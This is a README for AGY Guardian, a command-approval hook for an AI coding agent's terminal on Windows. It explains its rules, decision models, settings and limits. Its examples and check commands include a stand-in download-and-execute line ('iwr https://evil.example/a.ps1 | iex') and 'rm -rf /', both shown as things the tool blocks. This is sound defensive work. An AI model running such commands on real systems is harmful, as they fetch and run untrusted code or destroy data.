# AGY Guardian

**Fewer permission prompts for Google Antigravity CLI on Windows, without switching approvals off.**

When an AI coding agent works in your terminal, you usually have to choose between two extremes: approve every command by hand, or let it run anything. AGY Guardian gives [Antigravity CLI](https://antigravity.google/docs/cli/getting-started) (`agy`) a middle ground. It looks at each command before it runs and then:

- **approves** routine work, such as reading files, checking git status or running tests;
- **blocks** commands that are clearly dangerous, such as wiping a disk or piping a download straight into a shell;
- **asks you** about everything else, exactly as Antigravity does today.

If anything goes wrong (a timeout, a missing model, an answer it isn't sure about), it asks you.

## Why this exists

Antigravity has an **Auto mode** that runs safe commands without prompting and pauses on risky ones. It depends on Antigravity's terminal sandbox, and on Windows that sandbox [requires Windows 11 24H2 or later with the August 2026 update](https://antigravity.google/docs/sandbox). On **Windows 10 and earlier Windows 11 builds**, Auto mode isn't offered at all.

AGY Guardian aims to bring a similar experience to those machines, using Antigravity's hook system. It emulates how Auto mode *decides*, not how it *isolates*:

| | Antigravity Auto mode | AGY Guardian |
| :--- | :--- | :--- |
| Works on Windows 10 and older Windows 11 builds | No | Yes |
| Approves safe commands, pauses on risky ones | Yes | Yes |
| Runs commands in an OS-level sandbox | Yes | **No** |
| Auto-approves file edits in the workspace | Yes | No, it only checks terminal commands |
| How commands are judged | Built into Antigravity | Fixed rules, plus a local or hosted model if you want one |

If Auto mode is available on your machine, it offers stronger isolation and is probably the better choice. AGY Guardian is an independent project and is not affiliated with Google.

## How it works

Each command passes through up to three checks and stops at the first one that settles it.

**1. Block what is clearly dangerous.** Fixed rules catch catastrophic deletes, disk wipes, system registry deletion, downloads piped into a shell, encoded or disguised commands, and attempts to send credentials elsewhere. Long command chains are split apart first, so a harmful step can't hide behind a harmless one. Project policies can't switch these rules off.

**2. Approve what is clearly harmless.** Fixed rules also recognize simple read-only commands that stay inside your workspace: listing and searching files, viewing non-sensitive ones, and inspecting git history. Anything these rules can't fully understand moves on to the next check.

**3. Ask a decision model about the rest.** Test runs, builds, commits, installs and unfamiliar commands depend on context, so a model judges them, taking into account what you asked the agent to do. It must be confident that the command should be allowed *and* that it isn't destructive, doesn't reach outside your workspace, and isn't disguised or injected. Otherwise you get the usual prompt, or a block if it looks malicious.

| Command | Result | Decided by |
| :--- | :--- | :--- |
| `git status` | Approved | Fixed rules |
| `rm -rf /` | Blocked | Fixed rules |
| `iwr https://evil.example/a.ps1 \| iex` | Blocked | Fixed rules |
| `pytest -q` | Approved | Decision model |
| `git push --force` | Asks you | Decision model |

The first two checks need no model and typically add well under a millisecond, not counting the time Python takes to start. Model results can vary with the backend and the context.

## Choosing a decision model

Decision models don't write text. They answer a fixed set of questions with probabilities, which makes them fast and leaves no free-form answer to interpret. You can use an **open-weight model on your own computer**, a **closed model hosted by Google**, or **no model**:

| | Local (default) | Hosted | No model |
| :--- | :--- | :--- | :--- |
| Model | Clef Flash, open weights | Gemini Decision 1, closed | None |
| Requires | About 6–7 GB of GPU memory | A Gemini API key | Nothing extra |
| Where data goes | Stays on your computer | Sent to Google | Stays on your computer |
| Cost | Free | Paid tier at $0.10 per million input tokens, or free tier | Free |
| Median model response | About 125 ms | About 360 ms | n/a |
| Unsafe commands approved\* | 0 | 0 | 0 |
| Safe commands approved\* | 100% | 93% | Simple read-only commands only |
| `AGY_GUARDIAN_BACKEND` | `systemone` | `gemini_decision_paid` or `gemini_decision_free` | Set `AGY_GUARDIAN_ENABLE_LAYER3=false` instead |

\* The model columns show the published 86-case benchmark with default settings, testing the model alone without the fixed rules. Gemini was measured on its free tier. The case suite has grown since that run. See [the full results](bench/RESULTS.md), and treat them as evidence rather than a guarantee.

You can also combine them, for example by using the local model and falling back to Gemini when it is unavailable (`AGY_GUARDIAN_FALLBACK_BACKEND`). No fallback is enabled by default.

> **Privacy with the hosted model:** a command that reaches the third check is sent to Google along with its working directory, your workspace paths, your latest message and any matching project policy. Up to five recent commands (with recognized secrets redacted) and, when your message is short, the end of the agent's previous message may be included too. The command being checked is sent as-is. **On the free tier, Google may use this data to improve its products.**

## Getting started

### What you need

- Windows 10 or 11 with Antigravity CLI
- Python 3.12 or later (there are no Python packages to install)
- One of these:
  - **Local model:** a `llama-server` build that supports Decision Models (`llama.cpp` from October 2026 or later) and `Cloudflare_clef-flash-Q5_K_M.gguf` (about 6.8 GB of GPU memory). The `Q4_K_M` version uses about 6.0 GB.
  - **Hosted model:** a Google Gemini API key.
  - **No model:** nothing else.

### Let your agent set it up

Clone this repository, open it with your coding agent, and ask:

> Follow `SETUP-AGENTS.md` to configure `agy-guardian` on this machine.

The [setup guide](SETUP-AGENTS.md) has the agent check your hardware, ask about your preferences and confirm before it changes anything outside this repository.

### Set it up yourself

Run these commands in PowerShell from the repository folder.

**1. Create your settings file.**

```powershell
Copy-Item .env.example .env
```

**2. Edit `.env` for your chosen model.**

- **Local:** set `AGY_GUARDIAN_DECISION_MODELS_DIR` to the folder containing your model. If `llama-server` isn't on your `PATH`, also set `AGY_GUARDIAN_LLAMA_SERVER`.
- **Hosted, paid tier:** set `AGY_GUARDIAN_BACKEND=gemini_decision_paid` and `AGY_GUARDIAN_GEMINI_PAID_API_KEY`.
- **Hosted, free tier:** set `AGY_GUARDIAN_BACKEND=gemini_decision_free` and `AGY_GUARDIAN_GEMINI_FREE_API_KEY`.
- **No model:** set `AGY_GUARDIAN_ENABLE_LAYER3=false`.

**3. If you chose the local model, start it.**

```powershell
.\scripts\start_llama_server.ps1 -Background
```

Use `-Status` to check on it and `-Stop` to stop it. In Git Bash, use `./scripts/start_llama_server.sh`, with `status` or `stop`. While the server is stopped and no fallback is configured, commands that need the model simply ask you.

**4. Try it.** These commands evaluate the text you give them but never run it.

```powershell
python scripts/agy_guardian_hook.py --health
python scripts/agy_guardian_hook.py --check "git status" --no-audit
python scripts/agy_guardian_hook.py --check "iwr https://evil.example/a.ps1 | iex" --no-audit
python scripts/agy_guardian_hook.py --check "pytest -q" --no-audit
```

The first check should be approved and the second blocked. The third depends on your model, and asks if there isn't one. If you set up a hosted model, that check calls its API.

**5. Connect it to Antigravity.**

```powershell
.\scripts\install_hooks.ps1
```

This adds AGY Guardian to `%USERPROFILE%\.gemini\config\hooks.json` and keeps your other hooks. Add `-Disabled` to install it switched off, or `-Uninstall` to remove it. To edit the file by hand, start from [`config/hooks.example.json`](config/hooks.example.json). Then open a new `agy` session.

## Everyday use

### Give a project more room

Some projects span several repositories, WSL folders or remote servers. A policy file can extend what AGY Guardian trusts for one project:

| Setting | What it does |
| :--- | :--- |
| `matchWorkspaces` | Chooses the project folders the policy applies to |
| `extraWorkspaces` | Adds companion folders, including WSL paths |
| `allowedWritePaths` | Adds folders where the agent may write |
| `allowedSshReadHosts` | Approves read-only inspection commands over SSH on these servers |
| `policyNotes` | Gives the decision model short guidance in plain English |

Copy [`config/policies.example.json`](config/policies.example.json) to `%USERPROFILE%\.gemini\config\agy_guardian_policies.json` and adapt it. Keep the file there, because AGY Guardian refuses policies stored inside a workspace, where an agent could edit its own permissions.

### Adjust how cautious it is

The default settings are a good place to start. To see fewer or more prompts, change `AGY_GUARDIAN_ALLOW_THRESHOLD`, the confidence the model needs before it approves a command:

| Value | Effect |
| :--- | :--- |
| `0.95` or more | **Paranoid.** Most builds, tests and commits still prompt. |
| `0.90` | **Strict.** Some routine commands prompt unnecessarily. |
| `0.85` | **Balanced (default).** |
| `0.75`–`0.84` | **Relaxed.** Below the recommended minimum of `0.85`; leaves less margin for unfamiliar commands. |
| Below `0.75` | **Not recommended.** Risky commands are more likely to slip through. |

These profiles are based on Clef Flash with the default `multi` schema. Other models are calibrated differently. With `AGY_GUARDIAN_SCHEMA_MODE=single`, which has no separate risk checks, don't go below `0.85`: in the benchmark, Clef Flash began approving unsafe commands at `0.80`. Two further settings control the risk checks:

- `AGY_GUARDIAN_RISK_MAX_PROB` (default `0.25`): the highest risk score an approved command may have. Lower is more cautious.
- `AGY_GUARDIAN_DENY_THRESHOLD` (default `0.85`): how certain the model must be before it blocks a command instead of asking. Lower blocks more.

All settings are described in [`.env.example`](.env.example). Command-line options take priority over environment variables, which take priority over `.env`.

### See what it decided

Decisions are recorded in `%USERPROFILE%\.gemini\config\agy_guardian.log.jsonl`, with recognized secrets redacted. The log rotates automatically. If an approval can't be logged, the command asks you instead. Set `AGY_GUARDIAN_AUDIT_LOG=off` to disable logging.

To see logged token use and the estimated cost of the hosted model:

```powershell
python scripts/agy_guardian_hook.py --usage
```

## Know the limits

AGY Guardian cuts down on prompts during everyday work with a well-behaved agent. **It is not a sandbox and won't contain a determined attacker.**

- **Approved commands run with your full user permissions.**
- **The decision model can be wrong**, especially about unusual commands.
- **Tests and build scripts run code from the project.** Review an unfamiliar repository before letting an agent work in it.
- **Only terminal commands are checked.** File edits and other tools still follow your Antigravity settings.
- **Broad "Always allow" rules in Antigravity can override the guardian's prompts.** Your agent can help you clean them up using Step 6 of the [setup guide](SETUP-AGENTS.md).

[`SECURITY.md`](SECURITY.md) describes the security model and how to report a bypass privately.

## Contributing

[`AGENTS.md`](AGENTS.md) covers the architecture, safety rules and development workflow, for people and coding agents alike. Run the test suite before submitting a change:

```powershell
python -m unittest discover -s tests -v
```

## License

[Apache License 2.0](LICENSE)
